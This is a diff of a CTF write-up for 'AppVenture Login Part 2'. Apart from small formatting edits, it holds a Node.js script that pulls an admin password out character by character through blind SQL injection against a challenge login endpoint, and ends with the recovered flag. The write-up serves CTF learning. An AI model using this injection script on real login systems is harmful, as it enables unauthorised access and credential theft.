@@ -3,7 +3,7 @@ title: "[AVCTF2021] AppVenture Login Part 2"
 slug: avctf2021-av-login-p2
 author: [zhaoyun]
 date: 2021-12-21
-tags: [ctf, web,writeup]
+tags: [ctf, web, writeup]
 ---
 
 > Ok, you got the flag, but I bet you'll never get my password!
@@ -16,35 +16,41 @@ The flag format is `flag{...}` where characters consist of lower case letters, `
 
 ```js
 const fetch = require("node-fetch");
-const FormData = require('form-data');
+const FormData = require("form-data");
 
-let chars = "abcdefghijklmnopqrstuvwxyz_{}".split('');
+let chars = "abcdefghijklmnopqrstuvwxyz_{}".split("");
 let password = [];
 
 async function verify(i, c) {
-    const form = new FormData();
-    form.append('username', `admin' and SUBSTRING(password, ${i + 1}, 1)='${c}' --`);
-    const res = await fetch('http://35.240.143.82:4208/login', {method: 'POST', body: form})
-    const text = await res.text();
-    return text !== "Login failed"
+  const form = new FormData();
+  form.append(
+    "username",
+    `admin' and SUBSTRING(password, ${i + 1}, 1)='${c}' --`,
+  );
+  const res = await fetch("http://35.240.143.82:4208/login", {
+    method: "POST",
+    body: form,
+  });
+  const text = await res.text();
+  return text !== "Login failed";
 }
 
 async function step(i) {
-    for (let c of chars) {
-        if (await verify(i, c)) return c;
-    }
-    return null;
+  for (let c of chars) {
+    if (await verify(i, c)) return c;
+  }
+  return null;
 }
 
 async function brute_force() {
-    let i = 0;
-    while (true) {
-        password[i] = await step(i);
-        console.log(password.join(''));
-        if (!password[i]) break;
-        i++;
-    }
-    console.log(password.join(''));
+  let i = 0;
+  while (true) {
+    password[i] = await step(i);
+    console.log(password.join(""));
+    if (!password[i]) break;
+    i++;
+  }
+  console.log(password.join(""));
 }
 
 brute_force();
@@ -83,4 +89,3 @@ flag{oops_looks_like_youre_not_blind}
 ```
 
 Flag obtained
-
